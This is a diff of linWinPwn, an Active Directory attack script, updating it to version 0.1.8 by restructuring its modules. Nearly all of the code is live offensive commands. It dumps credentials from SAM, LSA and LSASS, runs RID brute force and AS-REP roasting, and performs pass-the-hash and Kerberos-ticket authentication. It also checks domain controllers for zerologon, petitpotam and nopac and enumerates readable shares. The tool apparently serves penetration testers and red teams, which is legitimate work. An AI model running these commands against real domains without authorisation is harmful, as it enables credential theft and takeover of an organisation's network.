@@ -6,7 +6,7 @@
 #     | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | |
 #     |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
 #
-# linWinPwn - version 0.1.7 (https://github.com/lefayjey/linWinPwn)
+# linWinPwn - version 0.1.8 (https://github.com/lefayjey/linWinPwn)
 # Author: lefayjey
 # Inspired by: S3cur3Th1sSh1t's WinPwn (https://github.com/S3cur3Th1sSh1t/WinPwn)
 #
@@ -53,7 +53,7 @@ print_banner () {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN} version 0.1.7
+      ${BLUE}linWinPwn: ${CYAN} version 0.1.8
       ${NC}https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey
 ${NC}
@@ -70,7 +70,7 @@ help_linWinPwn () {
     echo -e "-u     Username (default: Guest)"
     echo -e "-p     Password or LM:NT Hash or location to Kerberos ticket './krb5cc_ticket' (default: empty)" 
     echo -e "-M     Comma separated modules to run (default: ad_enum,kerberos)"
-    echo -e "       ${CYAN}Modules available:${NC} ad_enum, kerberos, scan_servers, pwd_dump, mssql_enum, user, all"
+    echo -e "       ${CYAN}Modules available:${NC} ad_enum, kerberos, scan_shares, pwd_dump, vuln_check, mssql_enum, user, all"
     echo -e "-o     Output directory (default: current dir)"
     echo -e ""
     echo -e "${YELLOW}Additional parameters${NC}"
@@ -132,11 +132,22 @@ prepare (){
     hash_bool=false
     kerb_bool=false
 
+    if [ "${user}" == "" ]; then user_out="null"; else user_out=${user}; fi
+    output_dir="${output_dir}/linWinPwn_$(date +%Y%m%d%H%M%S)_${dc_domain}_${user_out}"
+
+    servers_ip_list="${output_dir}/DomainRecon/ip_list_${dc_domain}.txt"
+    dc_ip_list="${output_dir}/DomainRecon/ip_list_dc_${dc_domain}.txt"
+    sql_ip_list="${output_dir}/DomainRecon/ip_list_sql_${dc_domain}.txt"
+    dc_hostname_list="${output_dir}/DomainRecon/server_list_dc_${dc_domain}.txt"
+    sql_hostname_list="${output_dir}/DomainRecon/server_list_sql_${dc_domain}.txt"
+    dns_records="${output_dir}/DomainRecon/dns_records_${dc_domain}.csv"
+
     #Check if null session is used
     if [ "${user}" == "" ]  && [ "${password}" == "" ]; then
         nullsess_bool=true
         target=${dc_ip}
         target_dc=${dc_ip_list}
+        target_sql=${sql_ip_list}
         argument_cme=""
         argument_smbmap=""
         echo -e "${YELLOW}[i]${NC} Authentication method: null session ${NC}"
@@ -145,6 +156,7 @@ prepare (){
     elif [ "${password}" == "" ]; then
         target=${dc_ip}
         target_dc=${dc_ip_list}
+        target_sql=${sql_ip_list}
         argument_cme="-d ${domain} -u ${user} -p ''"
         argument_ldapdns="-u ${domain}\\${user} -p ''"
         argument_smbmap="-d ${domain} -u ${user} -p ''"
@@ -158,12 +170,14 @@ prepare (){
         echo -e "${YELLOW}[i]${NC} Target domain: ${dc_domain} ${NC}"
     #Check if NTLM hash is used, and complete with empty LM hash
     elif ([ "${#password}" -eq 65 ] && [ "$(expr substr $password 33 1)" == ":" ]) || ([ "${#password}" -eq 33 ] && [ "$(expr substr $password 1 1)" == ":" ]) ; then
+        if [ "${user}" == "" ]; then echo -e "${RED}[i]${NC} Please specify username and try again..."; exit 1; fi
         hash_bool=true
         if [ "$(echo $password | cut -d ":" -f 1)" == "" ]; then
             password="aad3b435b51404eeaad3b435b51404ee"$password
         fi
         target=${dc_ip}
         target_dc=${dc_ip_list}
+        target_sql=${sql_ip_list}
         argument_cme="-d ${domain} -u ${user} -H ${password}"
         argument_ldapdns="-u ${domain}\\${user} -p ${password}"
         argument_smbmap="-d ${domain} -u ${user} -p ${password}"
@@ -171,26 +185,30 @@ prepare (){
         argument_bhd="-u ${user}@${domain} --hashes ${password}"
         argument_gMSA="-d ${domain} -u ${user} -p ${password}"
         argument_LRS="-u ${user} -nthash $(echo ${password} | cut -d ':' -f 2)"
-        argument_certipy="-u ${user}@${target} --hashes ${password}"
+        argument_certipy="${domain}/${user}@${target} -hashes ${password}"
         echo -e "${YELLOW}[i]${NC} Authentication method: NTLM hash of ${user}"
         echo -e "${YELLOW}[i]${NC} Target domain: ${dc_domain}"
     #Check if kerberos ticket is used
     elif [ -f "${password}" ] ; then
+        if [ "${user}" == "" ]; then echo -e "${RED}[i]${NC} Please specify username and try again..."; exit 1; fi
         kerb_bool=true
         target=${dc_domain}
         target_dc=${dc_hostname_list}
+        target_sql=${sql_hostname_list}
         export KRB5CCNAME=$(realpath $password)
         argument_cme="-d ${domain} -u ${user} -k"
         argument_imp="${domain}/${user} -k -no-pass"
         argument_bhd="-u ${user}@${domain} -k"
         argument_gMSA="-d ${domain} -u ${user} -k"
-        argument_certipy="-u ${user}@${target} -k -no-pass"
+        argument_certipy="${domain}/${user}@${dc_FQDN} -k -no-pass"
         kdc="$(echo $dc_FQDN | cut -d '.' -f 1)."
         echo -e "${YELLOW}[i]${NC} Authentication method: Kerberos Ticket of $user located at $(realpath $password)"
         echo -e "${YELLOW}[i]${NC} Target domain: ${dc_domain}"
     else
+        if [ "${user}" == "" ]; then echo -e "${RED}[i]${NC} Please specify username and try again..."; exit 1; fi
         target=${dc_ip}
         target_dc=${dc_ip_list}
+        target_sql=${sql_ip_list}
         argument_cme="-d ${domain} -u ${user} -p ${password}"
         argument_ldapdns="-u ${domain}\\${user} -p ${password}"
         argument_smbmap="-d ${domain} -u ${user} -p ${password}"
@@ -211,15 +229,6 @@ prepare (){
             exit 1
         fi
     fi
-    
-    output_dir="${output_dir}/linWinPwn_$(date +%Y%m%d%H%M%S)_${dc_domain}_${user}"
-
-    servers_ip_list="${output_dir}/DomainRecon/ip_list_${dc_domain}.txt"
-    dc_ip_list="${output_dir}/DomainRecon/ip_list_dc_${dc_domain}.txt"
-    sql_ip_list="${output_dir}/DomainRecon/ip_list_sql_${dc_domain}.txt"
-    dc_hostname_list="${output_dir}/DomainRecon/server_list_dc_${dc_domain}.txt"
-    sql_hostname_list="${output_dir}/DomainRecon/server_list_sql_${dc_domain}.txt"
-    dns_records="${output_dir}/DomainRecon/dns_records_${dc_domain}.csv"
 
     echo -e "${YELLOW}[i]${NC} Domain Controller's FQDN: ${dc_FQDN}"
     echo -e "${YELLOW}[i]${NC} Running modules: ${modules}"
@@ -258,6 +267,31 @@ dns_enum () {
     echo -e ""
 }
 
+nmap_scan () {
+    mkdir -p ${output_dir}/Scans
+
+    echo -e "${BLUE}[*] nmap scan on port 445 ${NC}"
+    if [ ! -f "${nmap}" ]; then
+        echo -e "${RED}[-] Please verify the installation of nmap ${NC}"
+    else
+        if [ -z "${servers_list}" ] ; then
+            servers_smb_list="${output_dir}/Scans/servers_list_smb_${dc_domain}.txt"
+            if [ ! -f "${servers_smb_list}" ]; then
+                ${nmap} -p 445 -Pn -sT -n -iL ${servers_ip_list} -oG ${output_dir}/Scans/nmap_smb_scan_${dc_domain}.txt 1>/dev/null 2>&1
+                grep -a "open" ${output_dir}/Scans/nmap_smb_scan_${dc_domain}.txt | cut -d " " -f 2 > ${servers_smb_list}
+            else
+                echo -e "${YELLOW}[i] SMB nmap scan results found ${NC}"
+            fi
+        else
+            servers_ip_list="${servers_list}"
+            servers_smb_list="${output_dir}/Scans/servers_custom_list_smb_${dc_domain}.txt"
+            ${nmap} -p 445 -Pn -sT -n -iL ${servers_ip_list} -oG ${output_dir}/Scans/nmap_smb_scan_custom_${dc_domain}.txt 1>/dev/null 2>&1
+            grep -a "open" ${output_dir}/Scans/nmap_smb_scan_custom_${dc_domain}.txt | cut -d " " -f 2 > ${servers_smb_list}
+        fi
+    fi
+    echo -e ""
+}
+
 main () {
     print_banner
 
@@ -285,12 +319,12 @@ main () {
             echo -e ""
             ;;
 
-            scan_servers)
+            scan_shares)
             dns_enum
-            echo -e "${GREEN}[+] Module Started: SMB Shares and RPC Scan${NC}"
-            echo -e "${GREEN}-------------------------------------------${NC}"
+            echo -e "${GREEN}[+] Module Started: Network Shares Scan${NC}"
+            echo -e "${GREEN}---------------------------------------${NC}"
             echo -e ""
-            scan_servers
+            scan_shares
             ;;
 
             pwd_dump)
@@ -310,6 +344,15 @@ main () {
             echo -e ""
             ;;
 
+            vuln_check)
+            dns_enum
+            echo -e "${GREEN}[+] Module Started: Vulnerability Checks${NC}"
+            echo -e "${GREEN}----------------------------------------${NC}"
+            echo -e ""
+            vuln_check
+            echo -e ""
+            ;;
+
             all)
             dns_enum
             echo -e "${GREEN}[+] Module Started: Active Directory Enumeration${NC}"
@@ -320,10 +363,14 @@ main () {
             echo -e "${GREEN}------------------------------------------${NC}"
             echo -e ""
             kerberos
-            echo -e "${GREEN}[+] Module Started: SMB Shares and RPC Scan${NC}"
-            echo -e "${GREEN}-------------------------------------------${NC}"
+            echo -e "${GREEN}[+] Module Started: Network Shares Scan${NC}"
+            echo -e "${GREEN}---------------------------------------${NC}"
             echo -e ""
-            scan_servers
+            scan_shares
+            echo -e "${GREEN}[+] Module Started: Vulnerability Checks${NC}"
+            echo -e "${GREEN}----------------------------------------${NC}"
+            echo -e ""
+            vuln_check
             echo -e "${GREEN}[+] Module Started: MSSQL Enumeration${NC}"
             echo -e "${GREEN}-------------------------------------${NC}"
             echo -e ""
@@ -344,10 +391,14 @@ main () {
             echo -e "${GREEN}------------------------------------------${NC}"
             echo -e ""
             kerberos
-            echo -e "${GREEN}[+] Module Started: SMB Shares and RPC Scan${NC}"
-            echo -e "${GREEN}-------------------------------------------${NC}"
+            echo -e "${GREEN}[+] Module Started: Network Shares Scan${NC}"
+            echo -e "${GREEN}---------------------------------------${NC}"
             echo -e ""
-            scan_servers
+            scan_shares
+            echo -e "${GREEN}[+] Module Started: Vulnerability Checks${NC}"
+            echo -e "${GREEN}----------------------------------------${NC}"
+            echo -e ""
+            vuln_check
             echo -e "${GREEN}[+] Module Started: MSSQL Enumeration${NC}"
             echo -e "${GREEN}-------------------------------------${NC}"
             echo -e ""
@@ -415,29 +466,20 @@ ad_enum () {
             echo -e "${CYAN}[*] rid brute ${NC}"
             ${crackmapexec} smb ${target} ${argument_cme} --rid-brute 2>/dev/null > ${output_dir}/DomainRecon/cme_rid_brute_${dc_domain}.txt
             /bin/cat ${output_dir}/DomainRecon/rid_brute_${dc_domain}.txt 2>/dev/null | grep "SidTypeUser" | cut -d ":" -f 2 | cut -d "\\" -f 2 | sed "s/ (SidTypeUser)\x1B\[0m//g" > ${output_dir}/DomainRecon/users_list_ridbrute_${dc_domain}.txt 2>&1
+            count=$(wc -l ${output_dir}/DomainRecon/users_list_ridbrute_${dc_domain}.txt | cut -d " " -f 1)
+            echo -e "${GREEN}[+] Found ${count} users using RID Brute Force"
             echo -e "${CYAN}[*] users enum ${NC}"
             ${crackmapexec} smb ${target} ${argument_cme} --users > ${output_dir}/DomainRecon/users_nullsess_${dc_domain}.txt
             /bin/cat ${output_dir}/DomainRecon/users_nullsess_${dc_domain}.txt 2>/dev/null | grep "${dc_domain}" | grep -v ":" | cut -d "\\" -f 2 | cut -d " " -f 1 > ${output_dir}/DomainRecon/users_list_nullsess_${dc_domain}.txt 2>&1
-        fi
-        echo -e "${CYAN}[*] spooler check ${NC}"
-        ${crackmapexec} smb ${target_dc} ${argument_cme} -M spooler 2>/dev/null | tee ${output_dir}/DomainRecon/cme_spooler_output_${dc_domain}.txt 2>&1
-        echo -e "${CYAN}[*] webdav check ${NC}"
-        ${crackmapexec} smb ${target_dc} ${argument_cme} -M webdav 2>/dev/null | tee ${output_dir}/DomainRecon/cme_webdav_output_${dc_domain}.txt 2>&1
-        echo -e "${CYAN}[*] nopac check ${NC}"
-        ${crackmapexec} smb ${target_dc} ${argument_cme} -M nopac 2>/dev/null | tee ${output_dir}/DomainRecon/cme_nopac_output_${dc_domain}.txt 2>&1
-        echo -e "${CYAN}[*] petitpotam check ${NC}"
-        for i in $(/bin/cat ${target_dc}); do
-            ${crackmapexec} smb ${i} ${argument_cme} -M petitpotam 2>/dev/null | tee -a ${output_dir}/DomainRecon/cme_petitpotam_output_${dc_domain}.txt 2>&1
-        done
+            count=$(wc -l ${output_dir}/DomainRecon/users_list_nullsess_${dc_domain}.txt | cut -d " " -f 1)
+            echo -e "${GREEN}[+] Found ${count} users using RPC User Enum"
+       fi
+
         echo -e "${CYAN}[*] Password Policy enum ${NC}"
         ${crackmapexec} smb ${target} ${argument_cme} --pass-pol 2>/dev/null | tee ${output_dir}/DomainRecon/cme_passpol_output_${dc_domain}.txt 2>&1
         echo -e "${CYAN}[*] GPP checks ${NC}"
         ${crackmapexec} smb ${target_dc} ${argument_cme} -M gpp_autologin 2>/dev/null | tee ${output_dir}/DomainRecon/cme_gpp_output_${dc_domain}.txt 2>&1
         ${crackmapexec} smb ${target_dc} ${argument_cme} -M gpp_password 2>/dev/null | tee -a ${output_dir}/DomainRecon/cme_gpp_output_${dc_domain}.txt 2>&1
-        if [ "${opsec_bool}" == false ] ; then
-            echo -e "${CYAN}[*] zerologon check. This may take a while... ${NC}"
-            ${crackmapexec} smb ${target} ${argument_cme} -M zerologon 2>/dev/null | tee ${output_dir}/DomainRecon/cme_zerologon_output_${dc_domain}.txt 2>&1
-        fi
         echo -e "${CYAN}[*] Password not required enum ${NC}"
         ${crackmapexec} ldap ${target_dc} ${argument_cme} --password-not-required --kdcHost "${kdc}${dc_domain}" 2>/dev/null | tee ${output_dir}/DomainRecon/cme_passnotrequired_output_${dc_domain}.txt 2>&1
         echo -e "${CYAN}[*] laps dump ${NC}"
@@ -521,10 +563,10 @@ ad_enum () {
     elif [ "${nullsess_bool}" == true ] ; then
         echo -e "${PURPLE}[-] certipy requires credentials${NC}"
     else
-        ${certipy} ${argument_certipy} find -vulnerable 2>/dev/null | tee ${output_dir}/DomainRecon/certipy_vuln_output_${dc_domain}.txt
-        ${certipy} ${argument_certipy} find -scheme ldap -vulnerable | tee -a ${output_dir}/DomainRecon/certipy_vuln_output_${dc_domain}.txt
-        ${certipy} ${argument_certipy} find 2>/dev/null > ${output_dir}/DomainRecon/certipy_all_output_${dc_domain}.txt
-        ${certipy} ${argument_certipy} find -scheme ldap >> ${output_dir}/DomainRecon/certipy_all_output_${dc_domain}.txt
+        ${certipy} ${argument_certipy} -nameserver ${dc_ip} find -vulnerable 2>/dev/null | tee ${output_dir}/DomainRecon/certipy_vuln_output_${dc_domain}.txt
+        ${certipy} ${argument_certipy} -nameserver ${dc_ip} find -scheme ldap -vulnerable | tee -a ${output_dir}/DomainRecon/certipy_vuln_output_${dc_domain}.txt
+        ${certipy} ${argument_certipy} -nameserver ${dc_ip} find 2>/dev/null > ${output_dir}/DomainRecon/certipy_all_output_${dc_domain}.txt
+        ${certipy} ${argument_certipy} -nameserver ${dc_ip} find -scheme ldap >> ${output_dir}/DomainRecon/certipy_all_output_${dc_domain}.txt
     fi
     echo -e ""
 }
@@ -589,6 +631,7 @@ kerberos () {
             /bin/cat ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt | grep krb5asrep | sed 's/\$krb5asrep\$23\$//' > ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt 2>&1
         fi
     fi 
+    echo -e ""
 
     #if [ ! -f "${crackmapexec}" ] ; then
     #    echo -e "${RED}[-] Please verify the installation of crackmapexec${NC}"
@@ -629,32 +672,9 @@ kerberos () {
     echo -e ""
 }
 
-scan_servers () {
-    mkdir -p ${output_dir}/Scans/SMBDump
-    echo -e "${BLUE}[*] nmap scan on port 445 ${NC}"
-    if [ ! -f "${nmap}" ]; then
-        echo -e "${RED}[-] Please verify the installation of nmap ${NC}"
-    else
-        servers_smb_list="${output_dir}/Scans/servers_list_smb_${dc_domain}.txt"
-        if [ ! -f "${servers_smb_list}" ]; then
-            ${nmap} -p 445 -Pn -sT -n -iL ${servers_ip_list} -oG ${output_dir}/Scans/nmap_smb_scan_${dc_domain}.txt 1>/dev/null 2>&1
-            grep -a "open" ${output_dir}/Scans/nmap_smb_scan_${dc_domain}.txt | cut -d " " -f 2 > ${servers_smb_list}
-        else
-            echo -e "${YELLOW}[i] SMB nmap scan results found ${NC}"
-        fi
-    fi
-    echo -e ""
-
-    echo -e "${BLUE}[*] crackmapexec enum${NC}"
-    if [ ! -f "${crackmapexec}" ] ; then
-        echo -e "${RED}[-] Please verify the installation of crackmapexec${NC}"
-    else
-        echo -e "${CYAN}[*] spooler check ${NC}"
-        ${crackmapexec} smb ${servers_smb_list} ${argument_cme} -M spooler 2>/dev/null > ${output_dir}/Scans/cme_spooler_scan_output_${dc_domain}.txt 2>&1
-        echo -e "${CYAN}[*] webdav check ${NC}"
-        ${crackmapexec} smb ${servers_smb_list} ${argument_cme} -M webdav 2>/dev/null > ${output_dir}/Scans/cme_webdav_scan_output_${dc_domain}.txt 2>&1
-    fi
-    echo -e ""
+scan_shares () {
+    mkdir -p ${output_dir}/Shares/SharesDump
+    nmap_scan
 
     echo -e "${BLUE}[*] SMB shares enum${NC}"
     if [ ! -f "${smbmap}" ]; then
@@ -666,12 +686,12 @@ scan_servers () {
             if [ "${kerb_bool}" == true ] ; then
                 echo -e "${PURPLE}[-] smbmap does not support kerberos tickets${NC}"
             else
-                ${smbmap} -H $i ${argument_smbmap} | grep -v "Working on it..." > ${output_dir}/Scans/SMBDump/smb_shares_${dc_domain}_${i}.txt 2>&1
+                ${smbmap} -H $i ${argument_smbmap} | grep -v "Working on it..." > ${output_dir}/Shares/SharesDump/smb_shares_${dc_domain}_${i}.txt 2>&1
             fi
         done
 
-        grep -iaH READ ${output_dir}/Scans/SMBDump/smb_shares_${dc_domain}_*.txt 2>&1 | grep -v 'prnproc\$\|IPC\$\|print\$\|SYSVOL\|NETLOGON' | sed "s/\t/ /g; s/   */ /g; s/READ ONLY/READ-ONLY/g; s/READ, WRITE/READ-WRITE/g; s/smb_shares_//; s/.txt://g; s/${dc_domain}_//g" | rev | cut -d "/" -f 1 | rev | awk -F " " '{print $1 ";"  $2 ";" $3}' > ${output_dir}/Scans/all_network_shares_${dc_domain}.csv
-        grep -iaH READ ${output_dir}/Scans/SMBDump/smb_shares_${dc_domain}_*.txt 2>&1 | grep -v 'prnproc\$\|IPC\$\|print\$\|SYSVOL\|NETLOGON' | sed "s/\t/ /g; s/   */ /g; s/READ ONLY/READ-ONLY/g; s/READ, WRITE/READ-WRITE/g; s/smb_shares_//; s/.txt://g; s/${dc_domain}_//g" | rev | cut -d "/" -f 1 | rev | awk -F " " '{print "\\\\" $1 "\\" $2}' > ${output_dir}/Scans/all_network_shares_${dc_domain}.txt
+        grep -iaH READ ${output_dir}/Shares/SharesDump/smb_shares_${dc_domain}_*.txt 2>&1 | grep -v 'prnproc\$\|IPC\$\|print\$\|SYSVOL\|NETLOGON' | sed "s/\t/ /g; s/   */ /g; s/READ ONLY/READ-ONLY/g; s/READ, WRITE/READ-WRITE/g; s/smb_shares_//; s/.txt://g; s/${dc_domain}_//g" | rev | cut -d "/" -f 1 | rev | awk -F " " '{print $1 ";"  $2 ";" $3}' > ${output_dir}/Shares/all_network_shares_${dc_domain}.csv
+        grep -iaH READ ${output_dir}/Shares/SharesDump/smb_shares_${dc_domain}_*.txt 2>&1 | grep -v 'prnproc\$\|IPC\$\|print\$\|SYSVOL\|NETLOGON' | sed "s/\t/ /g; s/   */ /g; s/READ ONLY/READ-ONLY/g; s/READ, WRITE/READ-WRITE/g; s/smb_shares_//; s/.txt://g; s/${dc_domain}_//g" | rev | cut -d "/" -f 1 | rev | awk -F " " '{print "\\\\" $1 "\\" $2}' > ${output_dir}/Shares/all_network_shares_${dc_domain}.txt
 
         echo -e "${BLUE}[*] Listing files in accessible shares - Step 2/2${NC}"
         for i in $(/bin/cat ${servers_smb_list}); do
@@ -679,7 +699,7 @@ scan_servers () {
             if [ "${kerb_bool}" == true ] ; then
                 echo -e "${PURPLE}[-] smbmap does not support kerberos tickets${NC}"
             else
-                ${smbmap} -H $i ${argument_smbmap} -g -R --exclude 'ADMIN$' 'C$' 'C' 'IPC$' 'print$' 'SYSVOL' 'NETLOGON' 'prnproc$' | grep -v "Working on it..." > ${output_dir}/Scans/SMBDump/smb_files_${dc_domain}_${i}.txt 2>&1
+                ${smbmap} -H $i ${argument_smbmap} -g -R --exclude 'ADMIN$' 'C$' 'C' 'IPC$' 'print$' 'SYSVOL' 'NETLOGON' 'prnproc$' | grep -v "Working on it..." > ${output_dir}/Shares/SharesDump/smb_files_${dc_domain}_${i}.txt 2>&1
             fi
         done
     fi
@@ -688,29 +708,13 @@ scan_servers () {
 
 pwd_dump () {
     mkdir -p ${output_dir}/Credentials
-    mkdir -p ${output_dir}/Scans
-    echo -e "${BLUE}[*] nmap scan on port 445 ${NC}"
-    if [ ! -f "${nmap}" ]; then
-        echo -e "${RED}[-] Please verify the installation of nmap ${NC}"
-    else
-        if [ -z "${servers_list}" ] ; then
-            echo -e "${YELLOW}[i] Servers list not provided, dumping passwords on all domain servers ${NC}"
-            servers_smb_list="${output_dir}/Scans/servers_list_smb_${dc_domain}.txt"
-            if [ ! -f "${servers_smb_list}" ]; then
-                ${nmap} -p 445 -Pn -sT -n -iL ${servers_ip_list} -oG ${output_dir}/Scans/nmap_smb_scan_${dc_domain}.txt 1>/dev/null 2>&1
-                grep -a "open" ${output_dir}/Scans/nmap_smb_scan_${dc_domain}.txt | cut -d " " -f 2 > ${servers_smb_list}
-            else
-                echo -e "${YELLOW}[i] SMB nmap scan results found ${NC}"
-            fi
-        else
-            servers_ip_list="${servers_list}"
-            servers_smb_list="${output_dir}/Scans/servers_custom_list_smb_${dc_domain}.txt"
-            ${nmap} -p 445 -Pn -sT -n -iL ${servers_ip_list} -oG ${output_dir}/Scans/nmap_smb_scan_custom_${dc_domain}.txt 1>/dev/null 2>&1
-            grep -a "open" ${output_dir}/Scans/nmap_smb_scan_custom_${dc_domain}.txt | cut -d " " -f 2 > ${servers_smb_list}
-        fi
-    fi
-    echo -e ""
     
+    if [ -z "${servers_list}" ] ; then
+        echo -e "${YELLOW}[i] Servers list not provided, dumping passwords on all domain servers ${NC}"
+    fi
+
+    nmap_scan
+
     if [ "${opsec_bool}" == false ] ; then
         echo -e "${BLUE}[*] Dump creds from SAM, LSA and LSASS memory ${NC}"
     else
@@ -723,6 +727,10 @@ pwd_dump () {
         if [ "${nullsess_bool}" == true ] ; then
             echo -e "${PURPLE}[-] Creds dump requires credentials${NC}"
         else
+            if [ "${kerb_bool}" == true ]; then
+                echo -e "${PURPLE}[-] Dumping creds from DC only${NC}"
+                servers_smb_list=${target_dc}
+            fi
             for i in $(/bin/cat ${servers_smb_list}); do
                 echo -e "${CYAN}[*] SAM LSA dump of ${i} ${NC}"
                 ${crackmapexec} smb ${i} ${argument_cme} --lsa | tee ${output_dir}/Credentials/lsa_dump_${dc_domain}_${i}.txt
@@ -743,7 +751,7 @@ mssql_enum () {
     if [ ! -f "${scripts_dir}/windapsearch.py" ] || [ ! -f "${impacket_dir}/GetUserSPNs.py" ]; then
         echo -e "${RED}[-] Please verify the location of windapsearch and GetUserSPNs.py${NC}"
     else
-        if  [ "${kerb_bool}" == false ] && [ "${hash_bool}" == false ] && [ "${nullsess_bool}" == false ]; then
+        if [ "${kerb_bool}" == false ] && [ "${hash_bool}" == false ] && [ "${nullsess_bool}" == false ]; then
             ${python} ${scripts_dir}/windapsearch.py ${argument_windap} --dc-ip ${dc_ip} --custom "(&(objectCategory=computer)(servicePrincipalName=MSSQLSvc*))" --attrs dNSHostName | grep dNSHostName | cut -d " " -f 2 | sort -u  >> ${sql_hostname_list}
         elif [ "${nullsess_bool}" == false ]; then
             ${python} ${impacket_dir}/GetUserSPNs.py ${argument_imp} -dc-ip ${dc_ip} -target-domain ${dc_domain} | grep "MSSQLSvc" | cut -d "/" -f 2 | cut -d ":" -f 1 | cut -d " " -f 1 | sort -u >> ${sql_hostname_list}
@@ -758,7 +766,38 @@ mssql_enum () {
         echo -e "${RED}[-] Please verify the installation of crackmapexec${NC}"
     else
        echo -e "${CYAN}[*] mssql_priv check ${NC}"
-        ${crackmapexec} mssql ${sql_ip_list} ${argument_cme} -M mssql_priv 2>/dev/null | tee ${output_dir}/DomainRecon/cme_mssql_priv_output_${dc_domain}.txt 2>&1
+       ${crackmapexec} mssql ${target_sql} ${argument_cme} -M mssql_priv 2>/dev/null | tee ${output_dir}/DomainRecon/cme_mssql_priv_output_${dc_domain}.txt 2>&1
+    fi
+    echo -e ""
+}
+
+vuln_check () {
+    mkdir -p ${output_dir}/Vulns
+    nmap_scan
+
+    echo -e "${BLUE}[*] crackmapexec enum${NC}"
+    if [ ! -f "${crackmapexec}" ] ; then
+        echo -e "${RED}[-] Please verify the installation of crackmapexec${NC}"
+    else
+        echo -e "${CYAN}[*] nopac check ${NC}"
+        ${crackmapexec} smb ${target_dc} ${argument_cme} -M nopac 2>/dev/null | tee ${output_dir}/Vulns/cme_nopac_output_${dc_domain}.txt 2>&1
+        echo -e "${CYAN}[*] petitpotam check ${NC}"
+        for i in $(/bin/cat ${target_dc}); do
+            ${crackmapexec} smb ${i} ${argument_cme} -M petitpotam 2>/dev/null | tee -a ${output_dir}/Vulns/cme_petitpotam_output_${dc_domain}.txt 2>&1
+        done
+        if [ "${opsec_bool}" == false ] ; then
+            echo -e "${CYAN}[*] zerologon check. This may take a while... ${NC}"
+            ${crackmapexec} smb ${target} ${argument_cme} -M zerologon 2>/dev/null | tee ${output_dir}/Vulns/cme_zerologon_output_${dc_domain}.txt 2>&1
+        fi
+        if [ "${kerb_bool}" == true ]; then
+            echo -e "${PURPLE}[-] Checking for Spooler and Webdav on DC only${NC}"
+            servers_smb_list=${target_dc}
+        fi
+        echo -e "${CYAN}[*] spooler check ${NC}"
+        ${crackmapexec} smb ${servers_smb_list} ${argument_cme} -M spooler 2>/dev/null | tee ${output_dir}/Vulns/cme_spooler_output_${dc_domain}.txt 2>&1
+        echo -e "${CYAN}[*] webdav check ${NC}"
+        ${crackmapexec} smb ${servers_smb_list} ${argument_cme} -M webdav 2>/dev/null | tee ${output_dir}/Vulns/cme_webdav_output_${dc_domain}.txt 2>&1
+        
     fi
     echo -e ""
 }
